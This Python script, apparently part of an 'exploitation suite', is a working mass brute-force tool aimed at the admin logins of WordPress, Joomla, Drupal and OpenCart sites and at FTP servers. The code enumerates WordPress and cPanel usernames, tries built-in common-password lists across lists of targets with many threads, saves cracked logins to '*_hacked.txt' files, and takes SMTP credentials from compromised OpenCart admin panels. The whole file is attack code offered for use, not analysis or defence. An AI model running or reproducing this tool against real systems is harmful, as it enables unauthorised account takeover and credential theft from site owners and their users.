#!/usr/bin/env python3
"""
CMS BRUTE FORCE MODULE v1.0
============================
WordPress, Joomla, Drupal, OpenCart, FTP brute force
Diadaptasi dari AlienExploit Tool1/BruteForce
Diintegrasikan ke GROOTX Exploitation Suite
"""

import requests
import re
import threading
import time
import json
import socket
import ftplib
import os
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════
THREADS = 50
TIMEOUT = 10
DELAY = 0.08

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Default password lists
WP_PASSWORDS = [
    'admin', 'password', 'admin123', 'admin1234', 'admin12345', 'admin123456',
    '123456', '12345678', '123456789', '1234567890', 'qwerty', 'abc123',
    'admin@123', 'admin@2023', 'admin@2024', 'P@ssw0rd', 'p@ssw0rd',
    'wordpress', 'wpadmin', 'root', 'toor', 'test', 'demo', 'guest',
    'administrator', 'admin2023', 'admin2024', 'pass123', 'pass1234',
    'letmein', 'welcome', 'monkey', 'dragon', 'master', 'login',
    'user', 'user123', 'test123', 'demo123', 'root123', 'admin1',
    'admin2', 'admin3', 'admin4', 'admin5', 'admin6', 'admin7', 'admin8',
    'admin9', 'admin0', 'admin11', 'admin12', 'admin13', 'admin14', 'admin15',
    'password1', 'password123', 'password1234', 'password12345', 'password123456',
    '1234', '12345', '1234567', '1234567890', '123123', '123321',
    '654321', '666666', '7777777', '888888', '999999', '000000',
    'iloveyou', 'trustno1', 'sunshine', 'princess', 'football', 'baseball',
    'shadow', 'superman', 'batman', 'starwars', 'whatever', 'freedom',
]

JOOMLA_PASSWORDS = [
    'admin', 'password', 'admin123', 'admin1234', 'admin12345', 'admin123456',
    '123456', '12345678', '123456789', '1234567890', 'qwerty', 'abc123',
    'admin@123', 'admin@2023', 'admin@2024', 'P@ssw0rd', 'p@ssw0rd',
    'joomla', 'root', 'toor', 'test', 'demo', 'guest', 'administrator',
    'admin2023', 'admin2024', 'pass123', 'pass1234', 'letmein', 'welcome',
    'monkey', 'dragon', 'master', 'login', 'user', 'user123', 'test123',
    'demo123', 'root123', 'admin1', 'admin2', 'admin3', 'admin4', 'admin5',
    'password1', 'password123', 'password1234', 'password12345', 'password123456',
    '1234', '12345', '1234567', '1234567890', '123123', '123321',
    '654321', '666666', '7777777', '888888', '999999', '000000',
]

DRUPAL_PASSWORDS = [
    'admin', 'password', 'admin123', 'admin1234', 'admin12345', 'admin123456',
    '123456', '12345678', '123456789', '1234567890', 'qwerty', 'abc123',
    'admin@123', 'admin@2023', 'admin@2024', 'P@ssw0rd', 'p@ssw0rd',
    'drupal', 'root', 'toor', 'test', 'demo', 'guest', 'administrator',
    'admin2023', 'admin2024', 'pass123', 'pass1234', 'letmein', 'welcome',
    'monkey', 'dragon', 'master', 'login', 'user', 'user123', 'test123',
    'demo123', 'root123', 'admin1', 'admin2', 'admin3', 'admin4', 'admin5',
    'password1', 'password123', 'password1234', 'password12345', 'password123456',
    '1234', '12345', '1234567', '1234567890', '123123', '123321',
    '654321', '666666', '7777777', '888888', '999999', '000000',
]

OPENCART_PASSWORDS = [
    'admin', 'password', 'admin123', 'admin1234', 'admin12345', 'admin123456',
    '123456', '12345678', '123456789', '1234567890', 'qwerty', 'abc123',
    'admin@123', 'admin@2023', 'admin@2024', 'P@ssw0rd', 'p@ssw0rd',
    'opencart', 'root', 'toor', 'test', 'demo', 'guest', 'administrator',
    'admin2023', 'admin2024', 'pass123', 'pass1234', 'letmein', 'welcome',
    'monkey', 'dragon', 'master', 'login', 'user', 'user123', 'test123',
    'demo123', 'root123', 'admin1', 'admin2', 'admin3', 'admin4', 'admin5',
    'password1', 'password123', 'password1234', 'password12345', 'password123456',
    '1234', '12345', '1234567', '1234567890', '123123', '123321',
    '654321', '666666', '7777777', '888888', '999999', '000000',
]

FTP_PASSWORDS = [
    'admin', 'password', 'admin123', 'admin1234', 'admin12345', 'admin123456',
    '123456', '12345678', '123456789', '1234567890', 'qwerty', 'abc123',
    'admin@123', 'admin@2023', 'admin@2024', 'P@ssw0rd', 'p@ssw0rd',
    'ftp', 'ftp123', 'ftpadmin', 'root', 'toor', 'test', 'demo', 'guest',
    'administrator', 'admin2023', 'admin2024', 'pass123', 'pass1234',
    'letmein', 'welcome', 'monkey', 'dragon', 'master', 'login',
    'user', 'user123', 'test123', 'demo123', 'root123', 'admin1',
    'admin2', 'admin3', 'admin4', 'admin5', 'password1', 'password123',
    'password1234', 'password12345', 'password123456', '1234', '12345',
    '1234567', '1234567890', '123123', '123321', '654321', '666666',
    '7777777', '888888', '999999', '000000', 'FTP@123', 'ftpftp123',
    'fuckyou!', 'ftp12', 'ftp1', 'ftp@!', 'ftp!@#', 'ftp@ftp',
    'ftp@2020', 'ftp@2019', 'ftp@2018', 'ftp1997', 'ftp2000', 'ftp2009',
]


# ═══════════════════════════════════════════════════════════════
# WORDPRESS BRUTE FORCE
# ═══════════════════════════════════════════════════════════════
class WordPressBruteForce:
    """WordPress brute force dengan username enumeration."""
    
    def __init__(self):
        self.flag = 0
        self.passwords = WP_PASSWORDS
        self.lock = threading.Lock()
    
    def run(self, site):
        """Run WordPress brute force on target site."""
        try:
            site = site.strip().rstrip('/')
            if not site.startswith(('http://', 'https://')):
                site = 'http://' + site
            
            # Get login form values
            source = requests.get(f'{site}/wp-login.php', timeout=TIMEOUT, headers=HEADERS, verify=False).content
            WpSubmitValue = re.findall('class="button button-primary button-large\" value="(.*)"', str(source))
            WpRedirctTo = re.findall('name="redirect_to" value="(.*)"', str(source))
            
            if WpSubmitValue:
                WpSubmitValue = WpSubmitValue[0]
                if 'Log In' in WpSubmitValue:
                    WpSubmitValue = 'Log+In'
            else:
                WpSubmitValue = 'Log+In'
            
            if WpRedirctTo:
                WpRedirctTo = WpRedirctTo[0]
            else:
                WpRedirctTo = ''
            
            # Username enumeration
            username = self._enumerate_username(site)
            if not username:
                username = 'admin'
            
            console.print(f"  [cyan]WordPress: {site} | Username: {username} | Passwords: {len(self.passwords)}[/cyan]")
            
            # Brute force
            for passwd in self.passwords:
                if self.flag == 1:
                    break
                self._brute_force(site, passwd, WpSubmitValue, WpRedirctTo, username)
                time.sleep(DELAY)
            
            if self.flag == 1:
                return True, site, username, passwd
            return False, site, None, None
        except Exception as e:
            return False, site, None, None
    
    def _enumerate_username(self, site):
        """Enumerate WordPress username via author page or REST API."""
        try:
            # Try REST API first
            r = requests.get(f'{site}/wp-json/wp/v2/users/1', timeout=5, headers=HEADERS, verify=False)
            data = json.loads(r.text)
            if 'slug' in data:
                return data['slug']
        except:
            pass
        
        try:
            # Try author page
            r = requests.get(f'{site}/?author=1', timeout=5, headers=HEADERS, verify=False)
            if '/author/' in r.text:
                matches = re.findall('/author/(.*)/"', r.text)
                if matches:
                    username = matches[0]
                    if '/feed' in username:
                        matches = re.findall('/author/(.*)/feed/"', r.text)
                        if matches:
                            return matches[0]
                    return username
        except:
            pass
        
        return None
    
    def _brute_force(self, site, passwd, WpSubmitValue, WpRedirctTo, username):
        """Single WordPress login attempt."""
        try:
            sess = requests.session()
            post = {
                'log': username,
                'pwd': passwd,
                'wp-submit': WpSubmitValue,
                'redirect_to': WpRedirctTo,
                'testcookie': 1
            }
            r = sess.post(f'{site}/wp-login.php', data=post, headers=HEADERS, timeout=TIMEOUT, verify=False)
            if 'wordpress_logged_in_' in str(r.cookies) or 'action=logout' in str(r.text):
                with self.lock:
                    if self.flag == 0:
                        self.flag = 1
                        console.print(f"  [green]✓ WordPress CRACKED: {site} | {username}:{passwd}[/green]")
                        with open('result/wordpress_hacked.txt', 'a') as f:
                            f.write(f'{site}/wp-login.php\nUsername: {username}\nPassword: {passwd}\n{"="*50}\n')
        except:
            pass


# ═══════════════════════════════════════════════════════════════
# JOOMLA BRUTE FORCE
# ═══════════════════════════════════════════════════════════════
class JoomlaBruteForce:
    """Joomla brute force dengan token extraction."""
    
    def __init__(self):
        self.flag = 0
        self.passwords = JOOMLA_PASSWORDS
        self.lock = threading.Lock()
    
    def run(self, site):
        """Run Joomla brute force on target site."""
        try:
            site = site.strip().rstrip('/')
            if not site.startswith(('http://', 'https://')):
                site = 'http://' + site
            
            console.print(f"  [cyan]Joomla: {site} | Passwords: {len(self.passwords)}[/cyan]")
            
            for passwd in self.passwords:
                if self.flag == 1:
                    break
                self._brute_force(site, passwd)
                time.sleep(DELAY)
            
            if self.flag == 1:
                return True, site, 'admin', passwd
            return False, site, None, None
        except:
            return False, site, None, None
    
    def _brute_force(self, site, passwd):
        """Single Joomla login attempt."""
        try:
            sess = requests.session()
            # Get token
            r = sess.get(f'{site}/administrator/index.php', timeout=5, headers=HEADERS, verify=False)
            token_match = re.findall(r'type="hidden" name="(.*)" value="1"', r.text)
            option_match = re.findall(r'type="hidden" name="option" value="(.*)"', r.text)
            
            token = token_match[0] if token_match else ''
            option = option_match[0] if option_match else 'com_login'
            
            post = {
                'username': 'admin',
                'passwd': passwd,
                'lang': 'en-GB',
                'option': option,
                'task': 'login',
            }
            if token:
                post[token] = '1'
            
            r = sess.post(f'{site}/administrator/index.php', data=post, headers=HEADERS, timeout=TIMEOUT, verify=False)
            if 'logout' in str(r.content) and 'com_users' in str(r.content):
                with self.lock:
                    if self.flag == 0:
                        self.flag = 1
                        console.print(f"  [green]✓ Joomla CRACKED: {site} | admin:{passwd}[/green]")
                        with open('result/joomla_hacked.txt', 'a') as f:
                            f.write(f'{site}/administrator/index.php\nUsername: admin\nPassword: {passwd}\n{"="*50}\n')
        except:
            pass


# ═══════════════════════════════════════════════════════════════
# DRUPAL BRUTE FORCE
# ═══════════════════════════════════════════════════════════════
class DrupalBruteForce:
    """Drupal brute force dengan form build ID extraction."""
    
    def __init__(self):
        self.flag = 0
        self.passwords = DRUPAL_PASSWORDS
        self.lock = threading.Lock()
    
    def run(self, site):
        """Run Drupal brute force on target site."""
        try:
            site = site.strip().rstrip('/')
            if not site.startswith(('http://', 'https://')):
                site = 'http://' + site
            
            console.print(f"  [cyan]Drupal: {site} | Passwords: {len(self.passwords)}[/cyan]")
            
            for passwd in self.passwords:
                if self.flag == 1:
                    break
                self._brute_force(site, passwd)
                time.sleep(DELAY)
            
            if self.flag == 1:
                return True, site, 'admin', passwd
            return False, site, None, None
        except:
            return False, site, None, None
    
    def _brute_force(self, site, passwd):
        """Single Drupal login attempt."""
        try:
            sess = requests.session()
            r = sess.get(f'{site}/user/login', timeout=5, headers=HEADERS, verify=False)
            form_build_id = re.findall(r'name="form_build_id" value="(.*)"', r.text)
            form_id = re.findall(r'name="form_id" value="(.*)"', r.text)
            
            if not form_build_id or not form_id:
                return
            
            post = {
                'name': 'admin',
                'pass': passwd,
                'form_build_id': form_build_id[0],
                'form_id': form_id[0],
                'op': 'Log+in'
            }
            
            r = sess.post(f'{site}/user/login', data=post, headers=HEADERS, timeout=TIMEOUT, verify=False)
            if 'Log out' in str(r.content) and 'edit' in str(r.content):
                with self.lock:
                    if self.flag == 0:
                        self.flag = 1
                        console.print(f"  [green]✓ Drupal CRACKED: {site} | admin:{passwd}[/green]")
                        with open('result/drupal_hacked.txt', 'a') as f:
                            f.write(f'{site}/user/login\nUsername: admin\nPassword: {passwd}\n{"="*50}\n')
        except:
            pass


# ═══════════════════════════════════════════════════════════════
# OPENCART BRUTE FORCE
# ═══════════════════════════════════════════════════════════════
class OpenCartBruteForce:
    """OpenCart brute force dengan token extraction dan SMTP harvesting."""
    
    def __init__(self):
        self.flag = 0
        self.passwords = OPENCART_PASSWORDS
        self.lock = threading.Lock()
    
    def run(self, site):
        """Run OpenCart brute force on target site."""
        try:
            site = site.strip().rstrip('/')
            if not site.startswith(('http://', 'https://')):
                site = 'http://' + site
            
            console.print(f"  [cyan]OpenCart: {site} | Passwords: {len(self.passwords)}[/cyan]")
            
            for passwd in self.passwords:
                if self.flag == 1:
                    break
                self._brute_force(site, passwd)
                time.sleep(DELAY)
            
            if self.flag == 1:
                return True, site, 'admin', passwd
            return False, site, None, None
        except:
            return False, site, None, None
    
    def _brute_force(self, site, passwd):
        """Single OpenCart login attempt."""
        try:
            sess = requests.session()
            post = {
                'username': 'admin',
                'password': passwd
            }
            r = sess.post(f'{site}/admin/index.php?route=common/login', data=post, headers=HEADERS, timeout=TIMEOUT, verify=False)
            
            if 'user_token=' in str(r.content) or 'token=' in str(r.content):
                with self.lock:
                    if self.flag == 0:
                        self.flag = 1
                        console.print(f"  [green]✓ OpenCart CRACKED: {site} | admin:{passwd}[/green]")
                        with open('result/opencart_hacked.txt', 'a') as f:
                            f.write(f'{site}/admin/index.php\nUsername: admin\nPassword: {passwd}\n{"="*50}\n')
                        
                        # Try to harvest SMTP credentials
                        self._harvest_smtp(sess, site, r.content)
        except:
            pass
    
    def _harvest_smtp(self, sess, site, content):
        """Harvest SMTP credentials from OpenCart settings."""
        try:
            if 'user_token=' in str(content):
                token = re.findall(r';user_token=(.*)">', str(content))[0].split('"')[0]
                settings_url = f'{site}/admin/index.php?route=setting/setting&user_token={token}'
            elif 'token=' in str(content):
                token = re.findall(r';token=(.*)">', str(content))[0].split('"')[0]
                settings_url = f'{site}/admin/index.php?route=setting/setting&token={token}'
            else:
                return
            
            r = sess.get(settings_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            smtp_host = re.findall(r'name="config_mail_smtp_hostname" value="(.*)"', r.text)
            smtp_user = re.findall(r'name="config_mail_smtp_username" value="(.*)"', r.text)
            smtp_pass = re.findall(r'name="config_mail_smtp_password" value="(.*)"', r.text)
            smtp_port = re.findall(r'name="config_mail_smtp_port" value="(.*)"', r.text)
            
            if smtp_user and smtp_pass and smtp_user[0] and smtp_pass[0]:
                console.print(f"  [yellow]  SMTP Found: {smtp_host[0] if smtp_host else 'N/A'} | {smtp_user[0]}:{smtp_pass[0]}[/yellow]")
                with open('result/smtp_results.txt', 'a') as f:
                    f.write(f'HostName: {smtp_host[0] if smtp_host else "N/A"}\nuser: {smtp_user[0]}\nPass: {smtp_pass[0]}\nPORT: {smtp_port[0] if smtp_port else "N/A"}\n{"="*50}\n')
        except:
            pass


# ═══════════════════════════════════════════════════════════════
# FTP BRUTE FORCE
# ═══════════════════════════════════════════════════════════════
class FTPBruteForce:
    """FTP brute force dengan cPanel username hunting."""
    
    def __init__(self):
        self.flag = 0
        self.lock = threading.Lock()
    
    def run(self, site):
        """Run FTP brute force on target site."""
        try:
            site = site.strip().rstrip('/')
            if site.startswith('http://'):
                site = site.replace('http://', '')
            elif site.startswith('https://'):
                site = site.replace('https://', '')
            
            # Check FTP port
            try:
                ip = socket.gethostbyname(site)
            except:
                ip = site
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if s.connect_ex((ip, 21)) != 0:
                s.close()
                return False, site, None, None
            s.close()
            
            # Try to find cPanel username from WordPress
            username = self._find_cpanel_username(site)
            if not username:
                username = 'admin'
            
            console.print(f"  [cyan]FTP: {site} (IP: {ip}) | Username: {username}[/cyan]")
            
            passwords = [
                username, 'FTP@123', 'ftp123', 'password', 'password1',
                'fuckyou!', 'ftpftp123', username + '123', username + '12',
                username + '1', username + '@!', username + '!@#',
                username + '@ftp', username + '@2020', username + '@2019',
                username + '@2018', username + '1997', username + '2000',
                username + '2009', username + '2019', username + '2018'
            ]
            
            for passwd in passwords:
                if self.flag == 1:
                    break
                self._brute_login(site, ip, username, passwd)
                time.sleep(0.1)
            
            if self.flag == 1:
                return True, site, username, passwd
            return False, site, None, None
        except:
            return False, site, None, None
    
    def _find_cpanel_username(self, site):
        """Find cPanel username from WordPress error pages."""
        try:
            r = requests.get(f'http://{site}/wp-includes/ID3/module.audio.ac3.php', timeout=10, headers=HEADERS, verify=False)
            match = re.findall(r'/home/(.*)/public_html/wp-includes/ID3/module.audio.ac3.php', r.text)
            if match:
                return match[0].strip()
        except:
            pass
        return None
    
    def _brute_login(self, site, ip, username, passwd):
        """Single FTP login attempt."""
        try:
            ftp = ftplib.FTP(ip, timeout=5)
            ftp.login(username, passwd)
            with self.lock:
                if self.flag == 0:
                    self.flag = 1
                    console.print(f"  [green]✓ FTP CRACKED: {site} | {username}:{passwd}[/green]")
                    with open('result/ftp_hacked.txt', 'a') as f:
                        f.write(f'Site: {site}\nIP: {ip}\nUsername: {username}\nPassword: {passwd}\n{"="*50}\n')
            ftp.quit()
        except:
            pass


# ═══════════════════════════════════════════════════════════════
# MASS BRUTE FORCE ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════
class MassBruteForce:
    """Orchestrator untuk mass CMS brute force."""
    
    def __init__(self):
        self.results = []
        self.lock = threading.Lock()
    
    def run(self, targets, cms_type='all', threads=THREADS):
        """
        Run mass brute force on multiple targets.
        
        Args:
            targets: List of target URLs
            cms_type: 'wordpress', 'joomla', 'drupal', 'opencart', 'ftp', or 'all'
            threads: Number of concurrent threads
        """
        os.makedirs('result', exist_ok=True)
        
        console.print(f"\n[bold cyan]MASS CMS BRUTE FORCE[/bold cyan]")
        console.print(f"  Targets: {len(targets)}")
        console.print(f"  CMS Type: {cms_type}")
        console.print(f"  Threads: {threads}")
        
        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Brute forcing...", total=len(targets))
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {}
                for target in targets:
                    if cms_type in ('all', 'wordpress'):
                        futures[executor.submit(self._run_wp, target)] = ('wordpress', target)
                    if cms_type in ('all', 'joomla'):
                        futures[executor.submit(self._run_joomla, target)] = ('joomla', target)
                    if cms_type in ('all', 'drupal'):
                        futures[executor.submit(self._run_drupal, target)] = ('drupal', target)
                    if cms_type in ('all', 'opencart'):
                        futures[executor.submit(self._run_opencart, target)] = ('opencart', target)
                    if cms_type in ('all', 'ftp'):
                        futures[executor.submit(self._run_ftp, target)] = ('ftp', target)
                
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    cms_type_name, target = futures[future]
                    try:
                        success, site, username, password = future.result()
                        if success:
                            with self.lock:
                                self.results.append({
                                    'cms': cms_type_name,
                                    'site': site,
                                    'username': username,
                                    'password': password
                                })
                    except:
                        pass
        
        # Summary
        console.print(f"\n[bold green]BRUTE FORCE COMPLETE[/bold green]")
        console.print(f"  Total cracked: {len(self.results)}")
        
        if self.results:
            table = Table(title="Cracked Credentials")
            table.add_column("CMS", width=12)
            table.add_column("Site", width=40)
            table.add_column("Username", width=15)
            table.add_column("Password", width=15)
            for r in self.results:
                table.add_row(r['cms'], r['site'], r['username'], r['password'])
            console.print(table)
        
        return self.results
    
    def _run_wp(self, target):
        wp = WordPressBruteForce()
        return wp.run(target)
    
    def _run_joomla(self, target):
        joomla = JoomlaBruteForce()
        return joomla.run(target)
    
    def _run_drupal(self, target):
        drupal = DrupalBruteForce()
        return drupal.run(target)
    
    def _run_opencart(self, target):
        opencart = OpenCartBruteForce()
        return opencart.run(target)
    
    def _run_ftp(self, target):
        ftp = FTPBruteForce()
        return ftp.run(target)


def main():
    """CLI interface"""
    import argparse
    parser = argparse.ArgumentParser(description="CMS Brute Force Module")
    parser.add_argument("-l", "--list", help="Target list file")
    parser.add_argument("-t", "--target", help="Single target")
    parser.add_argument("--cms", default="all", choices=["all", "wordpress", "joomla", "drupal", "opencart", "ftp"])
    parser.add_argument("--threads", type=int, default=THREADS)
    args = parser.parse_args()
    
    targets = []
    if args.list:
        with open(args.list) as f:
            targets = [l.strip() for l in f if l.strip()]
    elif args.target:
        targets = [args.target]
    else:
        console.print("[red]Error: Specify -l list.txt or -t target[/red]")
        return
    
    os.makedirs('result', exist_ok=True)
    bf = MassBruteForce()
    bf.run(targets, args.cms, args.threads)


if __name__ == "__main__":
    main()
